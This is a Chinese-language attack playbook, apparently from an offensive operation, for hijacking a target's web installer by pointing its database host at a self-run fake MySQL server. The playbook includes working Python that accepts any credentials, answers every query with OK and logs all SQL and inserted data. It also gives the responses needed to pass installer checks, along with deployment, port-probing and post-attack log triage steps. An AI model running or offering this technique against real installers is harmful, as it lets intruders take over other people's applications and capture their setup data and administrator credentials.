# 假 MySQL 劫持:把安装器/应用的 DB host 指向我方服务端

用途:目标安装器(install.php)/应用报「数据库权限不足，无法创建数据库」「创建数据库失败」时,用自己的 MySQL 服务端(接受任意凭据、对一切语句回 OK 并全量记录)替代真库,让流程继续并可观测。也适用于任何「需要 DBA 权限的初始化/建库步骤」被卡住的场景。

## 认证:接受任意用户名+任意密码
- mysql-mimic 自带 `SimpleIdentityProvider` 是「任意用户名 + **仅空密码**」(返回的 User 无 auth_string) —— 非空密码全被拒。
- 正确做法:自定义 IdentityProvider + 子类化 `NativePasswordAuthPlugin`,**同步覆写 `password_matches` 恒真**。
- **不要覆写 `async def auth` 去加观测日志** —— 基类签名不稳,可能把整个连接流程搞炸;要观测用 `get_user` / `password_matches` / Session 钩子。

```python
import asyncio, time
from mysql_mimic import MysqlServer, Session, ColumnType, ResultColumn, IdentityProvider, User
from mysql_mimic.auth import NativePasswordAuthPlugin, NoLoginAuthPlugin

LOG = "/root/fm/queries.log"
def log(s): open(LOG, "a").write(time.strftime("[%m-%d %H:%M:%S] ") + str(s)[:3000].replace("\n", " ") + "\n")

class AnyPassPlugin(NativePasswordAuthPlugin):
    def password_matches(self, user, scramble, nonce):
        log("PASSWD_MATCH user=%s" % getattr(user, "name", "?"))
        return True

class AnyIdentity(IdentityProvider):
    def get_plugins(self): return [AnyPassPlugin(), NoLoginAuthPlugin()]
    async def get_user(self, username):
        log("GET_USER %s" % username)
        return User(name=username, auth_plugin=AnyPassPlugin.name)

class S(Session):
    def __init__(self, *a, **kw):          # 连接级仪器: 区分「没连」vs「连上没发SQL」
        super().__init__(*a, **kw); log("NEW_CONN")
    async def handle_query(self, sql, attrs):
        log("SQL: " + str(sql)[:300])
        return self.route(sql)             # 实现见下

async def main():
    log("=== FAKE MYSQL START 0.0.0.0:3306 ===")
    await MysqlServer(session_factory=S, identity_provider=AnyIdentity()).serve_forever(host="0.0.0.0", port=3306)
asyncio.run(main())
```

## 语句回包约定(mysql-mimic)
- `handle_query(sql, attrs)` 返回:
  - `([rows], [ResultColumn(name, ColumnType.VARCHAR), ...])` = SELECT/SHOW 结果;
  - `None` = OK 包(一切写语句/连接初始化 `SET NAMES ...` 等)。
- 要「安装器全绿」至少覆盖:`SELECT VERSION()`(回版本串如 `8.0.23`;老安装器常比对)、`SELECT DATABASE()`、`CURRENT_USER`、`SCHEMATA`、`SHOW DATABASES`(**部分安装器建库后用 SHOW/SCHEMATA 验证,不返回目标库名会被判「创建失败」**)、`information_schema.TABLES`(旧表检测用,回空即「无旧数据」)。
- 回包里的库名回显当前 `USE` 的库;`USE db` 要记录(安装器常先 CREATE 再 USE)。
- DDL/DML 直接 None(OK),同时把 INSERT 落 JSON store——后续继续安装/复现登录时可保持同一库状态(第二次跑会发 SELECT 复读)。
- 值解析:VALUES 组按括号深度切分 + 处理引号/转义;`ON DUPLICATE KEY UPDATE` 先剥掉再解析。

## 部署与运维
- 安装:`pip install --break-system-packages mysql-mimic`(系统 Python 的 Ubuntu;venv 装失败时的替代)。
- `setsid nohup python3 fm_server.py >> server.log 2>&1 < /dev/null &` 启动;**启动后 sleep 2 查端口可能假 NO_LISTEN**(Python 冷启动慢),先 `ps` + 二次查,别急着重跑。
- 停服务用 `fuser -k 3306/tcp`(按端口杀,避免 `pkill -f` 自匹配杀死自身 exec shell)。
- 自检(从服务端本机):`pymysql.connect(host="127.0.0.1", port=3306, user="任意", password="任意", connect_timeout=8)` → `SELECT VERSION()` / `SHOW DATABASES` / `CREATE DATABASE` 全过 = 就绪。

## 网络前置(把「目标连不上」与「服务没起来」区分开)
- 部署机的 inbound 端口先用本机直连探测:`Connection refused(RST)` = 路由可达且端口空闲,可直接绑定服务;完全超时 = 被云安全组/防火墙丢弃,换端口或放开。
- 目标表单 host 字段若**无 port 输入框**,假库必须绑默认 3306;先读表单字段再部署。
- 开火后按连接级日志三分:无 NEW_CONN = 目标没出站(目标侧 egress 策略/解析异常);有 NEW_CONN 无 SQL = 握手/认证阶段失败;有 SQL = 进业务,按语句流判读。

## 安全姿态
- 假库只回 OK + 记录,不执行真实操作、不转发真库;store 只存在于我方机器。
- 「安装成功」后目标开始依赖我方库 = 写操作链条开始,推进前评估可恢复性(与安装器线整体红线一致)。
